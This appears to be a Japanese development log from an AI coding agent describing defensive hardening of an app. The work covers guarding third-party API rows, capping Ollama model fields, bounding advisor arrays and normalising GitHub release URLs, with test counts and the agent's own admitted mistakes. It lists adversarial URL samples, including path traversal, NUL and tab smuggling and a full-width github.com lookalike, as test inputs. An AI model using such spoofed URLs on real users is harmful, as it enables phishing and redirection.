つ捕まえた**: ① `chain:verify` (`shared/imageUrlGate.ts` は保護対象・block **#255**) ② `lint:shared-judgement` の census —— `isoDate` の main 側 import 元が 3 → 8 になり、**理由の散文が実測と食い違った**ので書き直した (「これは非対称ではなく設計した対である」を実測つきで)。`typecheck` 緑・`npm test` **829 / 18,264**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15285 → **15301** へ —— **今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 204 ms / heap 10.3 MB・FULL DCL 551 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **15 回目**でもあり、今回も再現しなかった))・**2026-09-22 パス 409 後も 11,946,016 B / 3,358,535 B で byte 単位で不変** (直したのは `src/main/clients/` 8 本と `shared/apiResponse.ts` に足した 1 関数だけ —— **`objectRows` を読むのは main のクライアントだけ**なので、ブラウザ版の束からは tree-shaking で丸ごと落ちる。`apiResponse.ts` 自体はブラウザ版も読むので「入るかもしれない」側だったが、**両方を組んで +0 B / +0 B を実測した**。**相手の一覧に壊れた行が 1 つ在ると、その画面が丸ごと落ちていた。** **見つけ方**: パス 408 の残作業として数えた母集団 (`?? ''` だけで第三者の文字列を受ける 13 件) を辿ったら、**そこに在ったのは天井ではなく「投げる」**だった。`(data.files ?? []).map((f) => ({ id: f.id, … }))` は、**配列でない値**と**物でない要素**のどちらも防がない (`??` は null / undefined しか受けない)。実測 (2026-09-22 ・ 直す前) —— **8 client のうち 7 本が 1 件で投げた**:

| client | 壊し方 | 直す前 |
| --- | --- | --- |
| **drive** | 要素が `null` / `modifiedTime` が無い / 数 / `files` が文字列 | **4 形とも投げる** |
| **calendar** | 要素が `null` / `start` が無い / `items` が文字列 | **3 形とも投げる** |
| **wordpress** | 要素が `null` / `last_updated` が数 / `sites` が文字列 | **3 形とも投げる** |
| slack / base / canva / gmail | 要素が `null` | **投げる** |
| atlassian | (資格情報の関門に先に当たり **測れていない**) | —— |

★ **投げると `fetchSnapshot` ごと失敗する** ので、**10 件のうち 1 件が壊れているだけでその画面には何も出ない**。Ollama (パス 407) は外側の `catch` が warning にしていたので「黙って短い一覧」で済んだが、**ここは画面が丸ごと落ちる側**である。★ **同じ問いは保管層の側で 2 度閉じられていた** —— `library.ts` の「行そのものは落とさない」(パス 136) と `recordShapeAudit.ts` の「壊れた行で画面が投げると、画面から消せなくなる」(パス 360 · 法則 `escape-hatch-stays-open`)。**第三者の応答の側だけが空いていた** —— パス 360 の docblock は保管層について「ここが唯一の出口になる」と書くが、応答の側には出口すら無い (利用者は壊れた行を消せない。相手の API が返してくる物だから)。**直し**: `shared/apiResponse.ts` に `objectRows(v)` を **1 つ**置き、**10 か所すべて**を通す (atlassian / base / calendar ×2 / canva ×2 / drive / gmail / slack / wordpress)。★ **保証するのは 2 つだけで、それを docblock が名指しする** —— ① 配列でなければ空 ② 要素は物 (null・配列・スカラーは落とす)。**欄の型は見ない** ので `row.name` は `unknown` のままであり、型引数は `jsonFetch<T>` が既に置いているのと同じ嘘の大きさである (**新しく増やしてはいないが、減らしてもいない**)。加えて、要素が物でも投げる欄の読み **3 か所**を直した: `calendar` の `e.start.date` (start が無い予定)・`drive` の `f.modifiedTime.slice`・`wordpress` の `(s.last_updated ?? '').slice`。★ **読める値の答えは 1 つも変えていない** (実測: 終日 / 時刻つきの予定・Drive の `2026-05-10`・WordPress の `2025-12-01` はすべて同じ)。壊れた行は**落ちるか空欄になる**。★ **日付の読みへはまだ寄せていないと、実物に書いた** —— パス 408 が Ollama について閉じた形 (`parseTimestamp` → `localIsoDate`・読めなければ `null` + 画面が理由を言う) は drive / wordpress にも当てはまるが、**このパスの主張は「投げない」**なので、表示の意味を黙って変えないために据え置いた (`docs/REMAINING_WORK.md` に母集団つきで残した)。検査は `main/clients/__tests__/responseRowGuards.test.ts` (**11 件**) で、背骨は**振る舞い** —— 7 client を実際に呼んで「投げない・良い行は残る」を見る。綴りの走査は **`main/clients/` 全体から母集団を導き**、素の `(… ?? []).map(` が **0 件**であることを両方向で留める。対照 **6 方向すべて鳴り、それぞれ狙った検査に当たる**: A 要素の選別をやめる ❌5 / B 配列の判定をやめる ❌2 / C drive の日付の門 ❌1 / D calendar の start の門 ❌1 / E wordpress の日付の門 ❌1 / F 素の形を 1 つ戻す ❌3 (**振る舞いと走査の両方が鳴る**)。★ **自戒: 床を `includes('objectRows(')` で書いたら 0 件になった** —— 呼び手は `objectRows<DriveFile>(data.files)` と**型引数を挟む**ので、名前と `(` が隣り合わない。**床が落ちて気付いた** (置いた床が自分の針の誤りを捕まえた形で、パス 334 / 369 と同じ家系: **綴りの針は、綴りでない物に動かされる**)。★ **もう 1 つ自戒: probe を 2 度 esbuild に落とされた** —— 括弧の対応を誤った 1 行で `Transform failed` になり、`Tests no tests` と出た。**「検査が 0 件」は緑ではない** (パス 357 で「Tests の行だけを見て緑と判断した」と書いた当のことの別の形)。**閉じていない物 (測った)**: ① **欄の型と天井は空いたまま** —— `?? ''` だけで第三者の文字列を受ける欄 **13 件**・`slice(0, 10)` で第三者の日付を切る **6 件**・生の第三者文字列が `DataList` の meta 行に載る画面 **2 枚** (`CloudflarePage:155` / `GithubPage:77`) ② **atlassian の一覧は振る舞いで確かめていない** (`objectRows` は通したが、probe が資格情報の関門に先に当たった)。`typecheck` 緑・`npm test` **827 / 18,248**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15274 → **15285** へ —— **今回も予想せず門に訊いた**)。**実機は回していない** —— 出荷物が 1 byte も動いていないので (両方を組んで確かめた))・**2026-09-22 パス 408 後の計測: 11,946,016 B / 3,358,535 B (両方 +57 B** —— モデル一覧の 4 欄に天井と日付の読みを足した分。`shared/ollama.ts` と `OllamaPage.tsx` は両ビルドが読むので LITE も同じだけ増える (main 側の `.slice(0, 10)` の除去は出荷物に入らない)。**モデル一覧の欄は型だけ検めており、~2 MB の第三者文字列が 1 行に載っていた。** **見つけ方**: パス 407 で「`/api/tags` を読む口を 1 つにする」を直したあと、**その 1 つの口を読み直した** —— 直した所の隣は、直した直後がいちばんよく見える。実測 (2026-09-22 ・ 直す前):

| 欄 | 検めていた物 | 200,000 字を入れると | 画面 |
| --- | --- | --- | --- |
| `name` | **正規表現 (128 字)** | **行ごと落ちる** | 出ない |
| `family` / `parameter_size` / `quantization_level` | **`typeof` だけ** | **そのまま 200,000 字** | meta 行へ |
| `modified_at` | **`typeof` だけ** | 同 (生の ISO 文字列も素通り) | `更新 <全文>` |
| `size` | `Number.isFinite` だけ | `-1e300` → **`-9.5367431640625e+293 MB`** | そのまま刷る |

★ **1 行目と 2 行目の対比が欠陥そのもの** —— `name` は天井を持ち、**同じオブジェクトリテラルの隣の 4 欄は持たない**。実測で 4 欄に 200,000 字を入れると **meta 行が 800,038 字**になり、応答の上限は `MAX_OLLAMA_RESPONSE_BYTES` (2 MiB) なので **1 件で ~2 MB が 1 行に載る**。パス 398 とまったく同じ非対称 (隣の 3 つが検めているのに 4 つ目だけがその前提を持たない) である。★ **相手は「利用者が設定した Ollama ホスト」** —— `isAllowedOllamaBase` はループバックのほか**頁と同じホスト**と任意の https を通し、`OllamaPage` は「スマホなど別の端末から使う」節まで持つ。**`isSafeModelName` がそもそも在る理由がそれ**で、その理由は隣の 4 欄にも等しく当てはまる。★ **`modified_at` には 3 つ目の欠陥が重なっていた** —— 非文字列のとき `''` になり、画面は **`更新 ` とだけ刷って理由を言わない** (法則 `blank-states-its-reason`)。しかも main だけが `.slice(0, 10)` していたので、**同じ `OllamaPage` が build によって `2026-09-22` と `2026-09-22T10:00:00.277302595-07:00` を出して**いた —— **`isoDate.ts` の `isoDateFromTimestamp` は「呼び出し側 3 か所が同じ `slice(0, 10)` を写していたのも、これで消える」と書いており、その 4 つ目の写しがここだった** (パス 407 は「整形は呼び手が持つ」としてそれを残した。日付にするのは*正規化*であって画面の都合ではないので、今回はその判断ごと直した)。**直し**: ① **3 つの札は天井 64 字 + `…`** (`MAX_OLLAMA_MODEL_DETAIL_CHARS`)。根拠は実物の値 (`llama` ≤ 6 / `7B` ≤ 5 / `Q4_K_M` ≤ 6) の **10 倍**で、**行ごとは落とさない** —— `family` が長いだけのモデルが一覧から消えるほうが利用者に悪い。**切ったことは `…` で述べる** (絞ることと述べることは対・パス 400) ② **更新日は「日付として読めるか」で決める** —— `typeof` → `parseTimestamp` → `localIsoDate`。`typeof` を先に置くのは `parseTimestamp` が**数を epoch ミリ秒として受ける**ためで、`20260922` を `1970-01-01` と読むのは**捏造**である (パス 394 の `isoMonthOf` と同じ理由)。日付にするのは `localIsoDate` —— `localDate.ts` が「瞬間 (epoch) を日付にするときも、利用者に見せるなら同じ関数でよい」と書いている当のことで、UTC で切ると日本 (UTC+9) では 0〜9 時の間だけ**前日**になる ③ **負の大きさは 0 へ** (ファイルに負の大きさは無い) ④ **画面が理由を言う** (`更新 ${m.modifiedAt ?? '日付が読めません'}`)。★ **桁違いの「正」の値は直さないと決めた (測って、理由を書いた)** —— `1e300` は有限で非負なので「読めた大きさ」で、0 へ倒すと**「0 MB のモデル」という嘘**になり壊れていることが画面から消える。`9.5e+293 MB` は誰の目にも壊れて見えるので**そちらが正直**であり、長さも 25 字以下なのでこのパスの主題 (行が膨らむ) には当たらない。★ **正直に言う: 答えが変わる入力が在る** —— 正常な応答の答えは 1 つも変わらないが、① 64 字を超える札は切られる ② `modifiedAt` が生の文字列から暦の日付になる (ブラウザ版は今まで ISO 全文を刷っていた) ③ 負の `size` が 0 になる。どれも意図した変更である。検査は `shared/__tests__/ollamaModelFieldCeilings.test.ts` (**16 件**) と `renderer/pages/__tests__/ollamaModelMetaOnScreen.test.ts` (**3 件**・jsdom で実際に描く。法則 92)。母集団は **`OllamaModelInfo` の宣言から導く** (欄を並べて書くと 7 つ目が黙る)。対照 **6 方向すべて鳴り、それぞれ狙った検査に当たる**: A 欄の天井を外す ❌4 (**800,019 → 600,029 字が再現**) / B 日付の `typeof` を外す ❌3 / C 日付を生のまま返す ❌9 / D 負の大きさの門を外す ❌1 (`expected -9.5367431640625e+293 to be +0`) / E 画面が理由を言わない ❌1 / F 7 つ目の欄を足す ❌2 (**欄名を名指しして「どの関門を通るか書け」と言う**)。★ **ゲートが 1 つ捕まえた**: `chain:verify` の**閉包検査** —— 保護対象 `shared/ollama.ts` が新しく `isoDate.ts` / `localDate.ts` を読むので、**判定が保護の外へ出ていた** (パス 402 とまったく同じ形)。2 本とも保護対象へ (保護対象 89 → **91**・block **#254**)。どちらも安定資産 (全履歴 6 / 2 コミット) で、`mutate` には既に載っていた (297 のまま)。★ **自戒**: 画面の対照を最初 `expect(t).not.toContain('…')` で書いたが、**この画面は別の所でも「1 個の…」と三点リーダを使う**ので錠になっていなかった (対照を回して初めて分かった)。`'x'.repeat(64) + '…'` と**値に付いた印**へ当て直した。**測って何も無かった軸も記録する**: ① **`typeof x === 'string' ? x : …` の 35 件** —— `shared/api/*.ts` の大半は `checkX` の**入力**読み (レンダラーが送る payload) で、同じ関数の中で `writeFieldLimits` の天井が続く。**この形は母集団ではない** ② `name` が `DataList` の title に入る経路は 128 字で閉じており、警告の一覧は `MAX_WARNING_BODY_CHARS` (100) を既に通る。**ただし同じ形は他所に在った (パス 409 の候補として実測した)** —— `main/clients/drive.ts:44` の `f.modifiedTime.slice(0, 10)` は **`??` すら無く 1 件で投げる** (パス 407 の Ollama とまったく同じ形)・`?? ''` だけで第三者の文字列を受ける欄が `main/clients/` に **13 件**・`slice(0, 10)` で第三者の日付を切る所が **6 件**・生の第三者文字列が `DataList` の meta 行に載る画面が **2 枚** (`CloudflarePage:155` の `plan` / `accountName` と `GithubPage:77` の `head` / `base`)。`typecheck` 緑・`npm test` **826 / 18,237**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15255 → **15274** へ —— **今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 225 ms / heap 10.1 MB・FULL DCL 574 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **14 回目**でもあり、今回も再現しなかった))・**2026-09-22 パス 407 後も 11,945,959 B / 3,358,478 B で byte 単位で不変** (直したのは `src/main/clients/ollama.ts` と検査 1 本だけ —— **ブラウザ版はこの main のクライアントを 1 行も読み込まない**ので、出荷物は動かない: **両方を組んで実測した** (「main だけだから変わらないはず」ではなく測った)。**Ollama のモデル一覧が main だけ素の読みで、非文字列 1 件で一覧が黙って短くなっていた。** **見つけ方**: パス 402 / 404 が使った「同名 export」の脈をそのまま辿り、**同じ問いに 2 通り答えている所**を探した —— `/api/tags` の応答を `OllamaModelInfo[]` にする読み手が **2 つ**在り、ブラウザ版は `shared/ollama.ts` の `normalizeModels` を、main は**自前の 6 欄の `??`** を通していた。実測 (2026-09-22 ・ 直す前・モデル 3 件のうち 2 件目を壊す):

| 壊し方 | `normalizeModels` (ブラウザ版) | main の素の読み |
| --- | --- | --- |
| `modified_at: 20260922` (数) | その欄を `''` にして**3 件とも通す** | **TypeError** (`.slice` が無い) —— **1 件で一覧が 2 件に縮む** |
| `size: '1MB'` (文字列) | `sizeMb: 0` | **`NaN MB`** を画面に刷る |
| `name: 42` (非文字列) | **その項目を飛ばす** | **`isSafeModelName` を通らないまま**画面へ |
| `item: null` | 飛ばす | `m.name` で **TypeError** |

★ **いちばん重いのは 1 行目で、失敗が「短い一覧」として現れる** —— 投げた所で `push` 済みの分だけが残り、外側の `catch` が warning (「Listing models failed」) にするので、**利用者は 3 件のうち 2 件だけの一覧を見る**。何件落ちたかはどこにも出ない。★ **同じアプリが同じ問いに 2 通り答え、弱い方が main に立っていた** —— パス 402 (`compareVersions`) とまったく同じ向きで、**どちらが危ない側かは名前からは分からない** (法則 `center-then-count-callers`)。しかも **`isSafeModelName` は main も import している** —— 使っていたのは `chat` の `model` 引数 (279 行) だけで、**一覧の側では呼んでいなかった**。★ **第三者は「利用者が設定した Ollama ホスト」である** —— `OllamaPage` は「スマホなど別の端末から使う」節を持ち、`isAllowedOllamaBase` は**頁と同じホスト**も通すので、127.0.0.1 の別プロセスや LAN のホストが相手になりうる。`isSafeModelName` がそもそも在る理由がそれである。**直し**: main も `normalizeModels` を通す **1 行**にする (`for (const m of normalizeModels(tags))`)。★ **整形は呼び手が持つ** (パス 386 の `bepDisplay` と同じ) —— 日付を 10 字へ切るのは main の画面の都合なので、判定を共有したうえで `{ ...m, modifiedAt: m.modifiedAt.slice(0, 10) }` と呼び手で切る。検査は `main/clients/__tests__/ollama.test.ts` に **4 件**足し (上の表の 4 つの壊し方を `fetchOllamaSnapshot` に実際に食わせる)、既存の `bare-model` の期待を `''` → `'—'` へ直した (**共有の読み手の既定はダッシュ**で、main の `??` の既定は空文字だった —— 画面は `m.family || '?'` なので**どちらも `?` にはならず、`—` と空欄で割れていた**)。対照 **2 方向とも鳴る**: A 素の読みへ戻す ❌4 (**4 つの症状がそのまま再現する**) / B `normalizeModels` の `isSafeModelName` を外す ❌2。★ **ゲートが 2 つ捕まえた**: ① `lint:zero-fold` の生成ブロック —— `(m.size ?? 0)` が消えたので母集団が 281 → **280** になり、`npm test` の `zeroFoldCensus` が `committed: 281 / 再生成: 280` と**自分で差分を刷って**落ちた (`npm run lint:*` は `--check` だけなので、再生成は script を引数無しで走らせる) ② `verify:arch` —— 行がずれて `ollama.ts:248-398` の `capAssistantReply` が漂流し、ユニットテスト数も引き直した (15251 → **15255**・**今回も予想せず門に訊いた**)。★ **自戒 2 つ**: ① 全件の結果を `tail -5` で受けたので、落ちた 2 件の名前が**私の手元から消えた** —— パス 393 が「落ちたときに要る情報を、落ちる前に切っていた」と書いた当のことを、**同じ形で繰り返した**。② probe の関数名を 2 度当て損ねた (`parseTagsPayload` / `fetchOllama` —— 実物は `fetchOllamaSnapshot`)。どちらも自分の検査がその場で捕まえた。**測って何も無かった軸も記録する**: ① **system プロンプトへの注入** —— prompt を組む関数は **6 つ**で、補間しているのは `business` の `allowedIds` (型が凍結された `BUSINESS_CATEGORY_IDS` の union)・`stocks` の `allowedSymbols` (**1 件ずつ `isSafeSymbol` を通してから**・件数にも天井)・`assistantContext` の確証済みコーパス・`VillagePage` は**補間  0 件**。**第三者や利用者の自由文が system へ入る経路は 0 件**だった ② **`ctx.payload` の読み 59 か所 (うちキャスト 34)** —— 書き込み口を抜き取って読むと、`path` は `typeof === 'string'` を先に見てから書き出し関門へ、`webhookUrl` は `new URL` で解析して `u.href` (= 解析結果) を送る (パス 325)。**キャストの直後に型を見ない危ない形は見つからなかった** ③ **`isLoopbackHostname` の 2 実装** —— 広い方 (`aiEndpoint`・127.0.0.0/8 全域と角括弧・末尾ドット) と狭い方 (`ollama`・4 つの集合) が在るが、`loopbackChecks.test.ts` が**意図的な差**として既に留めており、狭い方が守る側 (`isAllowedOllamaBase`) に立っている (**揃えると許可リストが緩む方向にしか働かない**と当のファイルが書いている)。`typecheck` 緑・`npm test` **824 / 18,218**・`verify:all` exit 0。**実機は回していない** —— 出荷物が 1 byte も動いていないので (両方を組んで確かめた))・**2026-09-22 パス 406 後の計測: 11,945,959 B / 3,358,478 B (両方 +37 B** —— 更新確認の URL の関門を `*OrNull` の形へ替えた分。`shared/updateCheck.ts` は両ビルドが読むので LITE も同じだけ増える。**これは罠の除去であって、生きた欠陥ではない (測った)。** `parseLatestRelease` は `isGithubReleaseUrl` で **`new URL()` の解析結果**に対して判定を下してから、**生の文字列**を返していた。実測 (2026-09-22 ・ 直す前) で **8 形のうち 6 形がずれる**:

| 生の `html_url` | 解析結果 |
| --- | --- |
| `https://github.com/o/r/../../evil` | `https://github.com/evil` |
| `https://GitHub.com/o/r/releases` | `https://github.com/o/r/releases` |
| `https://github.com/o/r/releases` + **NUL** | NUL が落ちる |
| `https://github.com/o/r/rel` + **タブ** + `eases` | タブが落ちる |
| `https://github.com:443/o/r/releases` | 既定ポートが落ちる |
| **全角 `ｇithub.com`** | `github.com` (IDNA) |

★ **今日は届かない (測った)** —— `verdict.url` の読み手は `openExternal` **ただ 1 つ**で、その先の `externalUrlOrNull` が再解析して `parsed.toString()` を `shell` へ渡す。画面のボタンの label は固定文字列 (「リリースページを開く」) で、URL の字面は出さない。★ **それでも揃えるのは、同じ関数の docblock が「送られてきた URL をそのまま信用しない」と述べており、その主張が偽だったから。** 2 つ目の読み手 (label として描く・`a.download` へ置く・fetch する) が増えた日に開く —— パス 291 / 325 と同じ家系で、位置づけはパス 359 / 398 と同じ (**罠を外す**)。★ **全角 ｇ の正規化が効き目そのもの** —— `https://ｇithub.com/a` は IDNA で**本物の github.com** になるので、生を返すと「本物なのに偽物に見える文字列」を画面側へ渡すことになる (既存の検査 1 件がこの正規化を既に留めていた)。**直し**: `githubReleaseUrlOrNull` を置き (repo の `*OrNull` の形 —— `externalUrlOrNull` / `slackWorkspaceDomainOrNull` / `isoMonthOf` と同じ)、`isGithubReleaseUrl` はその薄い包みにする。**判定は 1 つ**で、`parseLatestRelease` は返り値を使う (`url as string` のキャストも消えた)。対照 **4 方向すべて鳴る**: A 生へ戻す ❌6 (**罠がそのまま再現**) / B `parseLatestRelease` が生を返す ❌6 (同) / C ホストの判定を潰す ❌4 / D 真偽の包みを常に true ❌5。標本が的に当たることも別に留めた (6 形とも生の綴りと違う・床つき)。`typecheck` 緑・`npm test` **824 / 18,214**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15248 → **15251** へ —— **今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 213 ms / heap 10.3 MB・FULL DCL 606 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **13 回目**でもあり、今回も再現しなかった))・**2026-09-22 パス 405 後も 11,945,922 B / 3,358,441 B で byte 単位で不変** (直したのは `__tests__/` 1 本だけ —— **出荷物に入らない**。**CI が落ち、原因は私の針と私の手順だった。** パス 404 で足した `advisorArrayBounds` の `★ 空を断る配列は、件数の上限も持つ` が CI で `main/clients/stocks.ts:1202 rec.riskFactors` を「上限なし」と報告した —— **製品は正しく、針だけが盲目になった**。★ **原因**: 針の窓が `lines.slice(i, i + 14)` と**素の行**で切られており、`codeOnly()` は**行番号を保つためにブロックコメントを改行へ潰す**ので、**注記を 1 つ足すだけで門が窓の外へ出る**。★ **そして私はその注記を、別のゲートに言われて足していた** —— `lint:mutation-scope` が「新しい門が広い `Stryker disable` の帯を 30 → 34 行に広げた」と鳴ったので門を帯の外へ移し、そのとき 10 行の docblock を門の直前に入れた。**1 つのゲートの直しが、もう 1 つの針を潰した。** ★ **なぜ手元で映らなかったか —— `npm test` を最後の `src/` の編集より前に回し、その後 `verify:all` しか回さなかった。** CLAUDE.md の `verify:all` の行は「**`npm test` は含まない。CI は両方走らせるので、push 前は `npm test && npm run verify:all` の両方を回すこと (verify:all だけを見て「全 green」と言うと CI で落ちる)**」と太字で書いてある —— **その当のことを踏んだ**。順序は「**`src/` を触ったのが最後なら、`npm test` も回し直す**」。**直し**: 窓を**空でない行 (コードの行) で数える** —— 注記の長さに依らなくなり、報告の行番号は素の番号のまま。パス 334 / 348 / 369 / 375 と同じ家系 (**綴りの針は、綴りでない物に動かされる**)。対照: 素の行の窓へ戻すと **❌1・狙った検査に当たり CI の失敗をそのまま再現する**。標本を 2 つ足した —— **空行 12 本を挟んでも門は見える** (行番号は 1 のまま) / **コード 20 行の先は窓の外** (窓が無限になっていない・逆向き)。`typecheck` 緑・`npm test` **824 / 18,205**・`verify:all` exit 0。**実機は回していない** —— 出荷物が 1 byte も動いていないので)・**2026-09-22 パス 404 後の計測: 11,945,922 B / 3,358,441 B (両方 +99 B** —— 株式アドバイザーの応答に件数の門を 1 つ足し、prompt の数字 3 か所を定数から導いた分。main 側の同じ直しは**ブラウザ版の束に入らない**ので、増えるのは renderer / shared の分だけである。**アプリが LLM に「riskFactors 1-3 件」と指示しながら、その上限を両ビルドとも検めていなかった。** **見つけ方**: パス 402 が走査した同名 export 38 組の残りを読み、`validateAdvisorJson` が**3 つ**在ることに気付いた (株式 2 + 事業 1)。実測 (2026-09-22 ・ 直す前):

| 検証器 | riskFactors 100,000 件 | 件数の門 |
| --- | --- | --- |
| **株式 · main** | **通る (100,000 件のまま画面と書き出しへ)** | **無し** |
| **株式 · ブラウザ版** | **通る** | **無し** |
| 事業 · main / ブラウザ版 | 断る | `MAX_ADVISOR_RISK_FACTORS` = 3 |

★ **アプリ自身が上限を宣言していた** —— 両ビルドの prompt が「各 recommendation には必ず riskFactors (1-3 件) を含めること。」と書いており、**検めていたのは相手 (LLM) の善意だけ**だった。第三者の応答は「プロンプト注入・乗っ取られた proxy・悪意ある MCP サーバ」が誘導しうると `assistantLimits.ts` が名指ししている当のものである。★ **隣が正しい形を持ち、同じファイルがその表を載せていた** —— `advisorResponseLimits.ts` の docblock は 事業の 6 行の表を持ち、その 1 行が `riskFactors 1..3`。**株式の節はその 40 行下に在り、その行が無い。**

★ **なぜ抜けたか —— 構造的な理由が 2 つ在り、2 つ目が重い**: ① パリティ検査 2 本 (`advisorResponseParity` / `advisorValidationParity`) の母集団は**どちらも事業の 2 本だけ**で、株式は 1 度も入っていなかった (パス 334 の家系) ② **`dualBuildParity.test.ts` は株式の受理集合を実際に比べていて、通っていた** —— 主張が `expect(accepts(web)).toBe(accepts(main))` なので**両側が等しく緩ければ緑になる**。しかもその標本の一覧は `recommendations が 6 件 (境界・弾く)` を持ちながら `riskFactors` には型と空しか無く、**同じ一覧の中で片方の配列だけ件数を見ていなかった**。法則 `parity-is-not-correctness` の、このセッションで最も明白な実例である。

**届く先** (実測): 両ビルドとも出荷コードから呼ばれ (`web-shim.ts:731` / `stocks.ts:1376`)、main の 2 つ目の呼び手 `stocks.ts:1912` は **IPC 境界の `isAdvisorResult`** —— ダッシュボード書き出しの payload を見る所なので、**件数はファイルにも落ちる**。上流は `readCapped` (2 MiB) で切れるので、1 件 4 byte (`"x",`) なら 1 推奨あたり**約 52 万件**入る。**直し**: ① 両ビルドで `riskFactors.length > MAX_ADVISOR_RISK_FACTORS` を断る ② **新しい数は作らない** —— 2 つの prompt の文が**同じ 1 文**なので事業と同じ定数を読む (すぐ上の `MAX_ADVISOR_RECOMMENDATIONS` と同じ扱い。理由の長さ 600 / 400 が別なのは**表示欄の幅が違う**からで、そちらは別の数で正しい —— **同じ要求は 1 つ、別の要求は別に**) ③ **prompt の数も定数から導く** (3 か所。組み上がる文字列は 1 字も変わらない)。★ **正直に言う: 答えが変わる入力が在る** —— 1〜3 件の応答の答えは 1 つも変わらないが、**4 件以上は今まで通っていたものが断られる**。これは意図した変更で、隣の事業側が 2026-08-25 から同じ扱いをしている。黙って 3 件へ切る形は採らない (切るとモデルが指示を無視したことが消える)。検査は `shared/__tests__/advisorArrayBounds.test.ts` (**14 件**) で、**背骨は振る舞い** —— 4 つの検証器を実際に呼び、上限ちょうどは通し上限 +1 と 100,000 は断ることを見る (法則 `mention-vs-declaration`: 定数が在ることは門が在ることではない)。綴りの走査は「6 つ目の検証器が忘れたら鳴る」ための網で、**免除の台帳は両方向・今日 0 件**。`dualBuildParity` の一覧にも件数の境界 2 件を足した。対照 **6 方向すべて鳴り、それぞれ狙った検査に当たる** (A main の門を外す ❌3 (**欠陥がそのまま再現する**) / B ブラウザ版の門を外す ❌3 (同) / C prompt の数を字面へ戻す ❌1 / D 母集団から 1 本外す ❌1 (床) / E 針を常に「上限あり」に ❌1 (標本) / F 事業の打ち手の門を外す ❌2)。★ **ゲートが私の直しを 2 つ捕まえた**: ① `lint:mutation-scope` —— 新しい門を既存の広い `Stryker disable` の帯の中に置いたので帯が 30 → 34 行になった。**この門は新しい検査が振る舞いで直接殺す**ので帯の外へ出した (理由つき) ② `verify:arch` —— 行がずれて `docs/ARCHITECTURE.md` の `stocks.ts` の参照 2 件が漂流し、ユニットテスト数も引き直した (15238 → **15248**・**今回も予想せず門に訊いた**)。★ **自戒**: ① 検査は緑なのに `typecheck` だけが 1 件捕まえた (`readonly` の配列を可変の型へキャスト)。vitest は型を剥がすので、**パス 373 / 402 と同じ罠で 3 度目**である ② 事業の検証器は `validateBusinessAdvisorJson` という**別の名前**で、最初に書いた import は存在しない名前を掴んでいた —— **自分で置いた「標本が的に当たる」検査がその場で捕まえた** (パス 397 / 399 / 403 で 3 度踏んだ「当てていなかった」を、今回は先に塞げていた)。**測って何も無かった軸も記録する**: ① **HIBP の漏洩 0 件**は「調べられなかった」と混ざらない —— 失敗の枝は両ビルドとも投げ画面は `breachError` を出す。404 は HIBP の**答え**であって未解析ではない (VirusTotal の `0 / 0` と違う) ② **消費税の最有利方式** —— `compareBusinessTaxMethods` の `available` は省略すると簡易課税・2割特例を候補にするが、製品の呼び手 2 つ (TaxPage / FinancialAnalysis) は**どちらも渡している**。2 つの画面は 3割特例の条件式が違う (`ctKind === 'sole-proprietor' &&` が片方に無い) が、TaxPage の `entity` は `'corporation' | 'sole-proprietor'` で `'unknown'` を取らないので**等価** ③ **同名 export 38 組のうち 10 組を読んだ** —— `isSafeSvgExportPath` (teamradar / templates)・`readCapped`・`parseAtlassianToken` は**どれも共有の実装への 1 行の別名**で食い違いは無く、`extractJson` / `normalizeAnalysis` (emotions) は**写しだが等価** (同点は先頭を採る形が reduce とループで一致)。危機の相談窓口はモデルの答えではなく端末側の `detectCrisis` が決めるので、この写しは安全の判定を持たない ④ **配列の件数の門の母集団 13 件**のうち上限を持たない残り 3 件は検証器ではない (`latestTurnTooLong` は末尾 1 件しか読まない述語・`calcStdDev` と `seasonalIndices` は利用者自身の数列を受ける純関数)。法則 `envelope-checked-at-read` を延長した (**新しい法則は作らない** —— これはその法則の「述べた上限は検める」側の現れである)。`typecheck` 緑・`npm test` **824 / 18,203**・`verify:all` exit 0。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 224 ms / heap 10.1 MB・FULL DCL 597 ms / heap 36.8 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **12 回目**でもあり、今回も再現しなかった))・**2026-09-22 パス 403 後の計測: 11,945,823 B / 3,358,342 B (両方 +1,203 B** —— 判定・札・重さ・文を 1 つの switch から返す `describeScan` と、画面の理由の 1 文の分。**増分の大半は日本語の文**。`shared/api/` は両ビルドが読むので LITE も同じだけ増える。**URL スキャンが「誰も解析していない」を緑の帯で出していた。** **見つけ方**: パス 402 の形 (「第三者が名乗る値から安全の判定を作る所」) を security の 2 経路へ当てた。実測 (2026-09-22 ・ 直す前):

| VirusTotal の応答 | positives / total | 画面の帯 |
| --- | --- | --- |
| **解析が未完了 (0 エンジン)** | **0 / 0** | **`badge ok` (緑)**「0 / 0 エンジン検出」 |
| きれい (70 エンジンが無害と判定) | 0 / 75 | `badge ok` (緑)「0 / 75 エンジン検出」 |
| 1 件検出 | 1 / 75 | `badge warn` |

